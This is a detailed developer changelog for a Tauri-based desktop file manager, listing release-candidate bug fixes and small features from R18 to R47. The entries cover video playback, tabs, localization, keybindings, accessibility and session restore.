### v1.0.1-RC2-R47 — 2026-04-24 (bug fixes)
- Fix: **`_seekFrac` division by zero when seek track not yet laid out** — `getBoundingClientRect().width` is `0` before the element has been painted (e.g. user clicks seek bar within the same animation frame it was mounted); `(clientX - left) / 0 = Infinity`, which `Math.min(1, Infinity)` clamps to `1`, causing an immediate seek-to-end on first click; now guards with `if (!r.width) return 0`
- Fix: **Adjacent preload `<video>` elements survived slot teardown** — if the gallery slot was torn down (user navigated away) between the 800ms preload fire and the 3s cleanup timer, the hidden `<video preload=metadata>` elements in `document.body` kept GStreamer pipelines open for up to 2.1 more seconds; preload references are now tracked in `_preloadVids`/`_preloadCleanTimer` and `_cancelPreloads()` is called in `_cleanup()` to discard them immediately on teardown
- Fix: **`_mountMpvPlayer` failure left gallery slot blank** — on rejection (media server not started, file unreadable, GStreamer codec missing), `gSlot` was left as an empty black void with no feedback; now shows an inline error panel with the rejection message; guarded against overwrite if a subsequent mount already succeeded
- Fix: **Escape-to-parent in column view skipped history recording** — the breadcrumb Escape shortcut (and breadcrumb pill click in column view when the target column is already loaded) took a fast path that wrote `state.currentPath` directly and called `render()`, bypassing `_recordPathHistory()`, `state.history` push, and `_applySortPrefForPath()`; pressing Back after using this shortcut would go to the wrong location and per-folder sort preferences were not applied; all three are now called in the fast path
- No Rust recompile required (JS only)

### v1.0.1-RC2-R47 — 2026-04-24 (bug audit — 3 fixes)
- Fix: **`_showBar` rAF callback wrote to detached DOM after slot teardown** — the debounced `mousemove` handler queues a `requestAnimationFrame` to update `bar.style.opacity`; if `_cleanup()` fired while that rAF was pending (e.g. user navigated away mid-hover), the callback wrote `opacity` to a removed element; added `if (wrapper._dead) return` guard inside the rAF to bail immediately when the slot has been torn down
- Fix: **`d` parameter shadowed dependency accessor in adjacent-preload map** — the adjacent video preload used `.map(d => ...)` where `d` is the offset integer (−1 or 1), silently shadowing the outer `d()` dependency accessor function used two lines above; `d()` had already been destructured so there was no functional bug, but the naming confusion was a latent maintenance hazard; renamed the map parameter to `offset`
- Fix: **dead `pbSelCount` variable in `renderStatus` pane-B branch** — `pbSelCount` was computed (`_paneB.selIdx >= 0 ? 1 : 0`) but never referenced again in the branch; removed the unused variable
- No Rust recompile required (JS-only changes)

### v1.0.1-RC2-R46 — 2026-04-23 (gallery video playback — smooth as butter)
- Fix: **seek bar wrote `width%` to the DOM on every `timeupdate` event** — WebKit2GTK recalculates layout on any `width` change to an absolutely-positioned element; with GStreamer firing `timeupdate` up to 60× per second during playback, this caused a full layout pass 60× per second; switched seek fill and buffer fill from `width` to `transform:scaleX()` — transform changes are compositor-only and never trigger layout
- Fix: **`timeupdate` → DOM write was unthrottled** — even with scaleX, batching writes through `requestAnimationFrame` limits repaints to one per display frame maximum and skips frames entirely when the window is hidden; a `_rafSeek` guard prevents stacking rAF callbacks if GStreamer fires faster than 60fps
- Fix: **`mousemove` auto-hide timer churned on every pixel** — the control bar hide timer was being `clearTimeout`+`setTimeout` on every `mousemove` event (60+ per second during normal mouse movement); added an rAF debounce gate (`_showPending`) so at most one timer update fires per display frame; eliminated the constant GC pressure from rapid timer churn during video scrubbing
- Fix: **video wrapper was not on its own GPU compositing layer** — added `will-change:transform; transform:translateZ(0); contain:layout style` to the video wrapper div; this isolates the seek bar repaints to a single compositor layer and prevents them from triggering a full-page composite on every playback tick
- Fix: **seek fill and buffer fill not on compositor layers** — `will-change:transform` added to `.vc-seek-fill` and `.vc-seek-buf` in CSS; these are the elements that change every frame and were previously causing unnecessary compositing work
- Fix: **no `playsInline`** — added `video.playsInline = true`; some WebKit2GTK builds detach the video renderer without this attribute, causing a blank black frame for several hundred milliseconds after play starts
- Fix: **pending rAF and hide timer not cancelled on slot teardown** — `_cleanup()` now calls `cancelAnimationFrame(_rafSeek)` and `clearTimeout(_hideTimer)` before destroying the wrapper; previously a dangling rAF could fire after the DOM element was removed, writing to a detached element and potentially keeping the GC root alive
- Feature: **adjacent video preloading** — 800 ms after a video is mounted (enough time for the current video's demuxer to open), silently creates hidden `<video preload="metadata" muted>` elements for the previous and next videos in the gallery strip; this warms up GStreamer's plugin pipeline and demuxer so navigating to the adjacent file is instant rather than triggering a cold pipeline start; the probe elements are discarded after 3 s; skips WEBKIT_SKIP_EXTS (avi/m4v/ogv) and fires only when the media server is available
- No Rust recompile required (JS + CSS only)

### v1.0.1-RC2-R45 — 2026-04-21 (tab system bug fixes)
- Fix: **`makeTabState` had duplicate `_tagFilter`, `_tagFilterMode`, and `previewError` fields** — the object literal defined these keys twice due to stale copy-paste from r23/r28; JS silently uses the last value, but duplicate keys are dead code and a potential source of confusion; all three duplicates removed
- Fix: **Closing the active tab left the UI stale** — `closeTab(activeId)` called `switchTab(nextId, false)`, which updates `activeTabId` and `state` but deliberately skips `renderTabs()` and `render()`; the tab bar and content area were therefore never redrawn after closing the active tab; now calls `renderTabs();render()` immediately after `switchTab(false)` in the active-tab branch
- Fix: **`reopenLastTab` rendered the wrong view mode** — `newTab()` was called first (which renders immediately with the inherited view mode), then `viewMode`/`showHidden` were patched onto the new tab state object without triggering a re-render; the reopened tab appeared in the wrong view until the next navigation; rewritten to build the tab state with correct settings before the first render
- Fix: **"Close Tabs to Left/Right" could silently close the active tab** — these context menu actions iterated a snapshot of tabs and called `closeTab()` on each; if the currently active tab fell within the closed range, `closeTab(activeId)` fired but the preceding `switchTab(false)` call left the UI stale (see above bug); now the target tab is switched to first if the active tab is in the range to be closed, before any tabs are removed
- No Rust recompile required (JS-only changes)

### v1.0.1-RC2-R44 — 2026-04-19 (QoL gap audit — 5 fixes)
- Fix: **"Show in Folder" missing from search results context menu** — when `searchMode` is active and a file (not folder) is right-clicked, a new "Show in Folder" item now appears; clicking it navigates to the file's parent directory, exits search mode, and selects the file in the resulting view. This is the standard Finder/Dolphin/Nautilus flow for locating a found file in context.
- Fix: **Status bar showed bare "N results" in search mode** — now shows `N results for "query"`, giving users a persistent reminder of what they searched for without having to look at the breadcrumb.
- Fix: **Status bar ignored pane B focus** — `renderStatus()` always reflected the main pane state even when pane B was focused and active; now detects `isPaneBFocused()` and shows pane B's item count, selected file info, and current folder label. `isPaneBFocused` and `_paneB` added to `injectDeps`.
- Fix: **Recent Files overlay (Ctrl+Shift+E) had no "Show in Folder" for file entries** — each file row now has a small "⤢ Show" button that navigates to the file's parent directory and selects it there, without opening the file. The main row click still opens the file directly.
- Fix: **Cheatsheet category labels were hardcoded English** — all 6 category names (Navigation, Files, View, Edit, App, Network) and the "No shortcuts match" empty state are now routed through `t('kb.category.*')` and `t('cheatsheet.no_match')`. Seven new locale keys added across all 12 locales.
- Locale count: 381 → 386 keys across all 12 locales, all in sync.
- No Rust recompile required (JS-only changes).

### v1.0.1-RC2-R43 — 2026-04-18 (i18n gap fix — full locale coverage)
- Fix: **75 user-visible strings were hardcoded English** — `showToast()`, `_showDangerModal()`, `_showCreateModal()`, and `_sbProgress` labels across `main.js`, `views.js`, and `plugins.js` bypassed the `t()` i18n system; non-English users saw English text for all affected interactions
- Fix: **All 12 locale files now have 377 keys** (up from 295 at R42); 82 new `toast.*`, `dialog.*`, and `progress.*` keys added with native translations in all 11 non-English languages (de, es, fr, ja, zh, ar, hi, ko, nl, pt, ru)
- **Toast strings now localized:** no-recently-closed-tabs, clipboard-history-cleared, path/URI/relative-path/filename copied, multi-path copied, no-tags-in-folder, no-active-search, tag-rule-added, debug-info-copied, undo-history-cleared, device-mounted/ejected, visualizer-mode, permanently-deleted, merging/merged-files/merge-failed, music-applied, no-recent-items, tag-glob-required, folder-not-found, move-to/copy-to pane toasts, orphaned-tags-removed, plugin export/import, metadata editor toasts, op-failed/items-failed plurals, copied/moved (all contexts)
- **Danger modal strings now localized:** Clear Clipboard, Empty Trash (all 3 call sites, with count-aware variant), Move to Trash (Delete key), Permanently Delete (Shift+Delete), Secure Delete, Delete Duplicate, pane-B Move to Trash — including title, message, and confirmLabel for each
- **Progress bar labels now localized:** copying, moving, trashing, compressing, extracting, emptying trash, secure-delete passes, applying permissions — all `_sbProgress.start/update/finish/updateJob/finishJob` calls covered
- **Create modal strings now localized:** Save Search, New Folder (title/placeholder/default), New File, Rename, Extract Archive — all `_showCreateModal()` call sites
- No Rust recompile required (JS-only changes)

### v1.0.1-RC2-R42 — 2026-04-12 (gap audit fixes)
- Fix: **column-search banner leaked flex layout into column view** — `renderView()` set `host.style.display='flex'` and `flexDirection='column'` for the banner wrapper but never reset them; `_doRenderColumn` now clears both properties at its entry point so the column pane layout is always clean
- Fix: **icon view had no folder item-count badge** — gallery strip shows a count pill on folder thumbs; icon view was silent; added async `invoke('list_directory_fast')` per folder item in the icon view builder, rendering an `.iv-dir-count` pill badge using the same colour tiers and pill CSS as the gallery badge (shared rule in style.css)
- Fix: **`gthumb-dir-count` and `iv-dir-count` CSS now shared** — both selectors merged into a single rule block; only the `bottom`/`right` positioning differs per-variant
- Fix: **`gthumb-doc-badge` CSS class was defined but never populated** — the CSS for a file-extension label badge (e.g. "DOCX", "PDF", "ZIP") existed since r26 but `_makeGthumb` never created the element; now emitted for all `OFFICE_EXTS`, `PDF_EXTS`, and `ARCHIVE_EXTS` files; badge styled as a centred bottom pill with `backdrop-filter:blur(4px)` matching the count-badge family
- Fix: **folder preview panel showed no item count** — the info panel displayed size (async) but not how many direct children the folder has; now calls `list_directory_fast` and `get_dir_size_fast` concurrently via `Promise.all` and renders `N items · X MB` in the kind line once both resolve
- Fix: **tab label not updated after renaming the open folder** — both the modal rename path (`_showCreateModal`) and the inline contentEditable path now check `entry.path === state.currentPath` after a successful `rename_file`; if true they update `getActiveTab().label` to the new name and call `renderTabs()` so the tab strip reflects the change immediately
- Fix: **toast duration was hardcoded at 3200ms** — short toasts vanished before users finished reading longer messages; duration now scales: `min(6000, 2400 + max(0, msg.length − 20) × 40)ms`; error-type toasts receive an additional 1200ms; the effective range is 2400ms (≤20 chars) to 6000ms (≥109 chars) for info/success, and 3600ms–7200ms for errors

### v1.0.1-RC2-R41 — 2026-04-12 (gallery badge polish)
- Polish: **gallery folder item-count badge redesigned** — replaced the flat dark rectangle (`rgba(0,0,0,.65)`, 9px, radius 4px, clipped partly off-card) with a proper pill badge: 18px tall, 9px border-radius, `backdrop-filter:blur(6px)`, inner-glow border, drop shadow, and a count-tiered fill colour — slate (1–9), sky (10–99), blue (100–499), purple (500+); badges with a count of 0 are now hidden instead of showing "0"; counts above 999 display as "999+"

### v1.0.1-RC2-R40 — 2026-04-12 (QoL audit fixes)
- Fix: **Ctrl+Alt+T keybinding conflict** — `tag-filter` and `terminal` both used `Ctrl+Alt+T`; terminal always won because it was dispatched last; `tag-filter` default binding moved to `Ctrl+Alt+G`; cheatsheet updated accordingly
- Fix: **F2 rename not in keybinding table** — `F2` was documented in the cheatsheet and in a help tooltip but absent from `_KB_DEFAULTS`, so it was neither remappable nor listed in Settings → Shortcuts; added as `{ id:'rename', keys:{key:'F2'} }` with dispatch wired to `startRename(getSelectedEntries()[0])`
- Fix: **Shift+Delete not in keybinding table** — `Shift+Delete` (permanently delete, bypass Trash) was cheatsheet-only; added as `{ id:'delete-permanent', keys:{shift:true,key:'Delete'} }` with a danger-modal confirmation before calling `invoke('delete_items')`
- Fix: **F7 toggle-preview not in keybinding table** — the `toggle-preview` dispatch case existed but had no `_KB_DEFAULTS` entry, making it unreachable by keyboard and invisible in Settings → Shortcuts; added as `{ id:'toggle-preview', keys:{key:'F7'}, noInputBlock:true }`
- Fix: **Recent files display cap 10 vs storage cap 20** — `_getRecentFiles()` stores up to 20 entries but `_showRecentLocations` sliced to 10, discarding half; display slice raised to 20 to match storage cap
- Fix: **Empty Trash modal omitted total size** — confirmation dialog showed item count only; now computes `entries.reduce((a,e)=>a+(e.size||0),0)` and appends `(X MB)` to the message when size is known
- Fix: **Type-to-select had no visual feedback** — the 600ms prefix buffer was invisible; added a `#ff-tts-hud` floating pill (bottom-center, above status bar) that shows `Jump to: <prefix>` while typing and fades out with a 160ms opacity transition when the buffer resets
- Fix: **Status bar omitted folder modified date** — single folder selection showed only `· Name (folder)` with no date; now shows `· Name (folder) · <date>` matching the file row format
- Fix: **Column-view search fallback was silent** — switching to search mode while in column view swapped the layout to a flat list with no user-visible explanation; `renderView` now injects a `#ff-col-search-notice` info banner above the flat list explaining the fallback and suggesting switching to List view
- Fix: **List-view search lacked a Location column** — after R39 fixed list-view to use `renderListView` during search, it showed no path context; `renderListView` now inserts a `Location` `<col>` + `<th>` + per-row `<td>` (showing the parent directory, truncated with ellipsis) when `state.searchMode` is true; the column is also sortable via `state.listSort.col==='loc'`

### v1.0.1-RC2-R39 — 2026-04-12 (known-issues audit + list-search fix)
- Fix: **list view search fell back to flat list renderer** — `renderView()` search-mode branch routed both `list` and `column` to `renderFlatList`; list view should (and now does) use `renderListView` during search because `getVisibleEntries()` already returns `state.searchResults` in search mode, so the familiar sort columns, column-resize handles, and virtual-scroll virtualiser are preserved; column view still falls back to `renderFlatList` (correct — it requires a real directory tree)
- Docs: **removed stale known-issue** — "Undo only tracks paste (Ctrl+V)" was superseded at r67 when all 8 op types (move, copy, rename, delete, create, batchRename, tags, chmod) were wired into `undo.js`; entry removed from Known Issues
- Docs: **narrowed column-search known-issue** — updated the remaining entry to explicitly state that only column view falls back to a flat list; list/icon/gallery retain their own renderers during search

### v1.0.1-RC2-R38 — 2026-04-11 (a11y + gallery layout fixes)
- Fix: **a11y tests — gallery strip items missing ARIA attributes** — `_makeGthumb` built `.gthumb` elements with no ARIA attributes; `a11y.test.js` asserts `role="option"`, `aria-selected`, and `aria-label` on every gallery strip item (mirroring the attributes already set on column/list/icon rows); added `el.setAttribute('role','option')`, `el.setAttribute('aria-selected', isSel?'true':'false')`, and `el.setAttribute('aria-label', e.name+(e.is_dir?', folder':''))` to `_makeGthumb`; also updated the incremental fast-path loop to keep `aria-selected` in sync when selection changes without a full rebuild
- Fix: **`GTHUMB_W` / `THUMB_STRIDE` frozen at module load time** — both were module-level `const`s evaluated once when `views.js` was imported, at which point `d()` was still `null`; `iconSizeGallery` therefore always defaulted to `128` and the thumbnail width never responded to user preference changes made in Settings; converted to a live `_gthumbW()` getter function that reads `d()?.state?.iconSizeGallery` on every call; updated all three call sites (`_thumbLeft`, `_paintStrip` window calculation, `_scrollToSel` centering) to use `_gthumbW()` and removed the now-dead `THUMB_STRIDE` constant

### v1.0.1-RC2-R37 — 2026-04-11 (test fixes)
- Fix: **Rust tests — `search_advanced` signature mismatch** — 3 test calls still used the old 6-argument form after `size_op` and `date_op` (both `Option<String>`) were added to the function signature; affected tests: `search_regex_invalid_pattern_returns_error` (line 12436), `search_includes_hidden_files_when_flag_set` (line 12472), `search_contents_finds_text_inside_file` (line 12490); all three now pass `None, None` as the final two arguments; the other 8 calls in the test suite already had the correct arity
- Fix: **JS tests — `localStorage.clear is not a function`** — jsdom v24+ requires a valid origin (URL) for the Web Storage APIs to be instantiated; without it jsdom provides a non-functional stub and `localStorage.clear()` in `setup.js`s `beforeEach` hook throws at runtime, failing all 61 tests in `main.test.js`; fixed by adding `environmentOptions: { jsdom: { url: 'http://localhost' } }` to `vitest.config.js` — the correct Vitest-native solution rather than manually constructing a `JSDOM` instance in setup.js


### v1.0.1-RC2-R36 — 2026-04-11 (gallery fix)
- Fix: **Gallery view was completely broken** — `sortState` was used inside `_buildBarHtml()` (the gallery toolbar builder, added in R26 for the sort button) but was never added to the `renderGalleryView` destructuring of `d()`; at runtime `sortState` was `undefined`, causing a `TypeError: Cannot read properties of undefined (reading 'col')` that crashed the entire `renderGalleryView` call before any HTML was produced — resulting in a permanently blank gallery pane; fixed by adding `sortState` to the destructuring on line 2746 of `views.js`


### v1.0.1-RC2-R35 — 2026-04-11 (esbuild fix)
- Fix: esbuild (Vite's bundler) rejected two expressions in `crossPaneCopy` and `crossPaneMove` where `??` was mixed with `||` without explicit parentheses — `_paneB.path || panes[1].path ?? state.currentPath` is ambiguous under the ECMAScript spec and esbuild enforces the disambiguation; added parentheses: `(_paneB.path || panes[1].path) ?? state.currentPath`; this blocked `npm run tauri dev` and `cargo tauri build` with an esbuild parse error

**Note on version mismatch warning**: The `tauri-plugin-fs (v2.4.5) / @tauri-apps/plugin-fs (v2.5.0)` and `tauri-plugin-dialog` version mismatches are pre-existing in your environment and unrelated to this codebase — run `npm update` in the project root or pin the NPM packages to match your Cargo.toml versions to clear those warnings.

### v1.0.1-RC2-R34 — 2026-04-11 (CRITICAL boot fix)
- **Fix: app rendered a blank screen on launch** — `state._tagFilter` was missing from the global `state` object (only existed in `makeTabState` for per-tab state). The toolbar fast-path code added in R33 read `state._tagFilter.length` before any tab state was merged into `state`, causing a `TypeError: Cannot read properties of undefined (reading 'length')` that crashed the entire render chain before any DOM content was built. Sidebar, toolbar, and file view all appeared blank with status bar stuck on "Loading..."
- Fix: Added `_tagFilter:[]`, `_tagFilterMode:'AND'`, `_activeSavedSearch:null`, and `previewError:false` to the global `state` object initializer (all four were in `makeTabState` but not in the module-level `state`)
- Fix: Guarded the toolbar tag-filter indicator with `Array.isArray(state._tagFilter)` for defensive safety at early render time

### v1.0.1-RC2-R33 — 2026-04-11 (gap-fix)
- Fix: `state._activeSavedSearch` was not in `syncState` keys or `makeTabState` — switching tabs lost the saved-search auto-refresh registration; both now included
- Fix: `_runSavedSearch` did not clear `state._activeSavedSearch` on error — a failed search would keep the auto-refresh hook active and re-run the broken search on every subsequent dir-changed event; now cleared in the `.catch()` handler
- Fix: Omnibar action items (type `>`) displayed the raw action ID (e.g. `go-to-folder`) instead of the human-readable label and key chord; action rows now show the binding's `label` (e.g. "Go to folder") and `keyLabel` (e.g. "Ctrl+G") from `_KB_DEFAULTS`
- Fix: `toast.search_already_saved` was a hardcoded English string; added to all 12 locale files and switched to `t('toast.search_already_saved')`
- QoL: Toolbar now shows a purple "Tags: N" pill when a tag filter is active; clicking the pill re-opens the tag filter bar; the indicator updates in the fingerprint fast-path so it doesn't force a full toolbar rebuild on every render

### v1.0.1-RC2-R32 — 2026-04-11 (QoL)
- QoL: Omnibar (`Ctrl+K`) placeholder now reads "Go to path or recent location…  (› type > for actions)" — making the command-palette mode discoverable without prior knowledge
- QoL: Saved searches now auto-refresh — `_runSavedSearch` records `state._activeSavedSearch`; the `dir-changed` watcher event checks whether the changed path is under the search root and re-runs the search if so, keeping pinned search tabs live as files change; cleared on navigate away

### v1.0.1-RC2-R31 — 2026-04-11 (bug-fix)
- Fix: **Omnibar action dispatch was completely broken** — `_dispatchKbAction(item.path)` was called with a bare action-id string as the first argument, but `_dispatchKbAction` expects `(e, kb, noInputOnly, ctx)` (keyboard event, keybinding map, filter flag, state context); at runtime this produced `undefined` for all destructured args and silently did nothing; replaced with a direct action-id → function map covering all commonly-used actions (`_showOmnibar`, `_showGoToFolder`, `_showTagFilterBar`, `_showAdvancedSearch`, `newTab`, `promptCreate`, `showDiskUsage`, `showCloudDialog`, etc.)

### v1.0.1-RC2-R30 — 2026-04-09 (robustness)
- Fix: `_quickSaveSearch` allowed saving the same search query multiple times; now deduplicates by query string and shows "Search already saved" toast if a match exists
- Fix: `_saveTagRules` had no size limit; array is now capped at 50 rules (`slice(0,50)`) to prevent unbounded localStorage growth
- Fix: Smart Folders "Recent" and "Large Files" searched from `state.currentPath` only — meaning they only found files in the current folder tree rather than across the home directory; both now resolve `get_home_dir` and search from there (falling back to current path if unavailable)
- Fix: `_applyTagRules` had no stale-navigation guard — if the user navigated to a new folder while async tagging was still running, rules would apply tags to entries from the old folder that were no longer visible; added a path snapshot before the loop that returns early if `state.currentPath` changes mid-run
- Fix: `_showGoToFolder` navigate call had no error handler — if the user typed a non-existent path and pressed Enter, the dialog would close but nothing visible would happen; now shows an "error" toast with the bad path

### v1.0.1-RC2-R29 — 2026-04-09 (gap-fix)
- Fix: `previewError` was not in `syncState` keys — tab switching reset the error state so a re-render after switching back would show a blank panel instead of the error message; added to syncState, makeTabState, and the keys list
- Fix: `iconSizeIcon` and `iconSizeGallery` were not in `syncState` — switching tabs reset per-view icon sizes; both added to syncState, saveSession (persisted per-tab), and restoreSession (restored on relaunch)
- Fix: tag filter bar and `state._tagFilter` were not cleared on folder navigation — pills showed stale tags from previous folder; `applyNavState` now resets `_tagFilter`/`_tagFilterMode` and removes the bar DOM element when navigating to a new path

### v1.0.1-RC2-R28 — 2026-04-09
- New: Multi-tag filtering (`Ctrl+Alt+T`) — tag filter bar slides in above the view host showing all tags in the current folder as pill buttons; click tags to toggle them into the active filter (highlighted with a halo), press the AND/OR mode button to switch logic; the filter applies inside `getVisibleEntries` so it composes correctly with the name filter and sort; `_tagFilter` and `_tagFilterMode` are synced across tab switches via `syncState`
- New: Tag Auto-Rules settings UI — Settings → Customisation now has a "Tag Auto-Rules" section with a three-column form (glob pattern, optional path prefix, tag name); rules are shown as deletable rows; all rules persisted to `ff_tag_rules` localStorage and applied by `_applyTagRules()` after every directory load
- Improvement: Tag filter keybinding `Ctrl+Alt+T` added to `_KB_DEFAULTS` — visible in cheatsheet, remappable in Settings → Shortcuts

### v1.0.1-RC2-R27 — 2026-04-09
- New: Persistent search — "📌 Save" button appears in the breadcrumb rail whenever search results are active; clicking it opens a lightweight inline dialog pre-filled with the query, letting you name and save the search to the Saved Searches sidebar section with one action; uses existing `_getSavedSearches`/`_setSavedSearches` infrastructure
- New: Smart Folders sidebar section — four built-in virtual queries above the Tags section: **Recent** (files modified in the last 7 days, sorted newest first), **Large Files** (files >100 MB, sorted largest first), **Downloads** (navigates to `~/Downloads`), **Screenshots** (navigates to `~/Pictures/Screenshots` → `~/Screenshots` → `~/Pictures`); collapsible with the same `_sbCol` mechanism as other sections; no disk storage — queries run live on every click
- New: Tag Auto-Rules — passive rule engine stored in `ff_tag_rules` localStorage; rules are `{glob, pathPrefix, tag}` objects; `_applyTagRules()` runs after every `loadTagsForEntries()` call and auto-tags matching files via `set_file_tags_v2`; `_matchGlob()` supports `*` and `?` wildcards; rules can be managed via `_getTagRules()`/`_saveTagRules()` (UI hookup in Settings pending)

### v1.0.1-RC2-R26 — 2026-04-09
- New: `Ctrl+G` Go to Folder — dedicated path dialog with `~` expansion (resolved via `get_home_dir`), live filesystem tab-completion (reads `list_directory` as you type), `Tab` to accept the top completion, `↑`/`↓` to choose, `Enter` to navigate; fills to `~/` on open so the first keystroke starts narrowing immediately
- New: Command palette extension for `Ctrl+K` omnibar — type `>` prefix to switch into action mode (shows all keybinding actions filtered by label), or get 3 action suggestions inline in any normal search; selecting an action dispatches through `_dispatchKbAction` so the full keybinding system handles it; actions shown with a purple `> cmd` badge
- New: Gallery sort controls — Sort button added to the gallery toolbar showing the current column name and direction arrow (`↑`/`↓`); clicking opens the existing `showSortMenu` popup so gallery sort works identically to list/column view sort including direction toggle and Folders First

### v1.0.1-RC2-R25 — 2026-04-05
- Fix: inline rename (`F2`, slow-double-click on label) was broken in all views — `startRename()` referenced an undefined closure variable `selector`, causing `document.querySelector(undefined)` to always return `null` and always fall back to the modal dialog; fixed by deriving the element from `entry.path` via `[data-path]` attribute lookup across `.ico-lbl`, `.cell-name-text`, and `.fname` selectors
- Fix: icon view label elements had no `class` or `data-path`, preventing the path-based lookup; added `lbl.className='ico-lbl'` and `lbl.dataset.path=e.path` to `makeItem`
- Fix: list view `cell-name-text` spans had no `data-path`; added `data-path` attribute so startRename can locate them
- Fix: column view `fname` spans had no `data-path`; added `data-path` attribute
- QoL: icon size slider (`Ctrl+Shift+=/−`) is now per-view — icon view remembers its own size (`ff_icon_size_icon`), gallery view remembers its own strip thumbnail size (`ff_icon_size_gallery`), column/list share the original global key; switching views no longer resets thumbnail sizes across views
- QoL: gallery strip thumbnail width responds to the gallery-specific size preference, scaling proportionally

### v1.0.1-RC2-R24 — 2026-04-05
- Fix: sidebar favourites (and Locations/SFTP/FTP/Cloud/MTP items) did not highlight when navigating to a matching path via keyboard, breadcrumb, restored session, or omnibar; `applyNavState` now sets `state.activeSb` to the deepest matching favourite path on every navigation
- Fix: clipboard history panel (`Ctrl+Shift+V`) had no keyboard navigation — only mouse clicks worked; added arrow-up/down to move focus, Enter to paste the focused item, with scrollIntoView so the focused row is always visible
- Fix: sort popup closed immediately when clicking the same column to toggle direction, making it impossible to see the direction change; same-column clicks now update the arrow indicator in-place and keep the popup open — only different-column or Folders First clicks close it
- Fix: gallery view showed a black void for empty directories; added an "Empty folder" icon+label matching the behaviour of column, list, and icon views
- Fix: cheatsheet (`Ctrl+/`) was a static 40+ entry table with no way to find a specific shortcut; added a live filter input (autofocused on open) that filters both by label and by key chord across all categories; category badges appear next to each result when a filter is active
- Fix: dragging files onto sidebar favourite items did not show the blue `drop-over` highlight even though dropping worked; the fav-reorder `dragover` handler was intercepting all drags and overriding the `drop-over` CSS class — now only fires when a sidebar item itself is being reordered (`_dragFavIdx >= 0`)

### v1.0.1-RC2-R23 — 2026-04-05
- Fix: `Ctrl+Shift+R` batch rename was missing from `_KB_DEFAULTS` — invisible in cheatsheet and not remappable in Settings → Shortcuts; added the entry, wired dispatch case, and imported `showBatchRenameDialog` (the function itself was already fully implemented in views.js)
- Fix: preview panel showed a silent blank when `get_file_preview` threw an error; added `state.previewError` flag (set in the catch block, cleared on new load) and render a styled "Preview unavailable" panel with icon and description instead of a blank void
- Fix: view mode was global (`ff_viewMode` single localStorage key); added `ff_view_prefs` per-folder map matching the `ff_sort_prefs` pattern — `_saveViewPrefForPath` called when user manually switches modes, `_applyViewPrefForPath` called in `applyNavState` on every navigation
- Fix: new tab always opened in global default view mode instead of inheriting the active tab's current view mode; `newTab()` now copies `viewMode` from the active tab's state
- Fix: `notifyOpComplete()` was only called from paste (Ctrl+V) and trash paths; now also fires after successful copy/move batch operations when the window is not focused
- Fix: `crossPaneCopy()` and `crossPaneMove()` (F5/F6) always read selection from the main pane's `sel` object even when Pane B was focused; both functions now check `isPaneBFocused()` and read from `_paneB.selIdx`/`_paneB.entries` when appropriate, with correct source/dest swap
- Fix: split-pane active state was saved to `sessionStorage` (lost on restart); `saveSession()` now writes `paneB: { active, path, viewMode }` into `ff_session`, and `restoreSession()` reopens and navigates Pane B after tabs are restored
- Fix: typing in the search box then switching tabs before pressing Enter lost the typed text; `syncState()` now flushes the live DOM search input value to `state.search` before saving the tab snapshot (skipped if the input is currently focused to avoid clobbering mid-type)

### v1.0.1-RC2-R22 — 2026-04-05
- Fix: `toast.select_single_file` locale key was missing from all 11 non-English locale files; all 12 locales are now at 294 keys and the CI locale gate passes cleanly
- Fix: `_showOpenRecent` (`Ctrl+Shift+E`) now shows two sections — **Files** (last 10 opened files from `ff_recent_files`, with coloured extension badge and parent-folder path) and **Folders** (last 10 navigated locations); previously it only showed path history
- Fix: `makeTabState` now initialises `_restoreColScrolls: {}` and `_restoreListScroll: 0` directly, so a fresh tab that becomes a background tab before any session-restore never falls back to undefined and silently loses its scroll position on restart
- Fix: `toggle-preview` action (toolbar button and `Ctrl+P` in views.js) now sets `pointer-events: none` on `#preview-resize-handle` when the panel is hidden, so the invisible drag handle no longer intercepts mouse events on the content area
- Feature: Cloud sidebar entries now show a live reachability dot — green (●) when `check_cloud_remote_reachable` returns true, red (●) when offline; the probe fires asynchronously after `renderSidebar()` so it never blocks the sidebar render
- Polish: Drive type badges (NVMe/SSD/HDD/USB/NET/OPT) are now pill-shaped with per-type colour fill, inset glow border, monospace font, and a type-glyph prefix (⚡ NVMe, ◆ SSD, ○ HDD, ⧄ USB, ◎ NET); active-item override keeps them legible on blue backgrounds

### v1.0.1-RC2-R20 — 2026-04-04
- Fix: `saveSession` was reading column and list-view scroll positions from the active tab's DOM for *all* tabs; background tabs now use their cached `_restoreColScrolls`/`_restoreListScroll` values, so restart scroll restoration is correct for every tab
- Fix: `reopenLastTab` (Ctrl+Shift+T) now restores the closed tab's `viewMode` and `showHidden`; previously only the path was saved/restored
- Fix: `renderTabs` now calls `scrollIntoView({ inline:'nearest' })` on the active tab element after rebuilding the bar, so Ctrl+Tab or Ctrl+1–9 always keeps the active tab visible when the bar overflows
- Fix: `duplicate-tab` (both Ctrl+Shift+D keybinding and context menu) now copies `listSort` into the new tab state; previously sort column/direction was always reset to default
- Fix: `toggle-preview` action now sets `--preview-hidden` CSS variable and calls `render()`, bringing it in sync with the views.js Ctrl+P handler; prevents layout drift when toggling via toolbar vs keyboard
- Fix: `saveSession` now serialises `listSort` per tab; `restoreSession` reads it back so list-view sort order survives an app restart
- QoL: Tab context menu now includes "Close Tabs to Left" alongside "Close Tabs to Right"

### v1.0.1-RC2-R19 — 2026-04-04
- Fix: `ff_iconSize` / `ff_icon_size` localStorage key split — state init and keyboard shortcuts used different keys so icon size never survived a reload; unified to `ff_icon_size` (default `80`)
- Fix: three duplicate keybindings in `_KB_DEFAULTS`: `Ctrl+Shift+D` (Compare files remapped → `Ctrl+Shift+M`), `Ctrl+Shift+E` (Error log remapped → `Ctrl+Shift+L`), `Ctrl+Shift+V` (Encrypted vaults remapped → `Ctrl+Shift+K`)
- Fix: cheat sheet had duplicate F3 and F5 entries and was missing `Ctrl+K`, `Ctrl+Shift+A`, `Ctrl+Shift+V` (clipboard), `F2` rename, `Ctrl+I`; rebuilt as single clean table reflecting the actual keybinding table
- Feature: recently-opened files tracker — `_recordRecentFile()` is called on every `open_file` invoke; stores last 20 files under `ff_recent_files` in localStorage
- Feature: per-folder filter bar persistence — Ctrl+F now restores the last filter used in each folder; cleared when you explicitly dismiss with Esc or ✕
- Fix: Empty Trash modal now shows the actual item count ("Permanently delete 14 items…" instead of "all items")

### v1.0.1-RC2-R18 — 2026-04-04
- Fix: app freeze after pressing Stop — `<a download>.click()` triggers WebKit2GTK's download interception handler which blocks the main thread; replaced with Tauri-native `dialog.save()` + `fs.writeFile()` so the recording is saved via a proper native save dialog without freezing
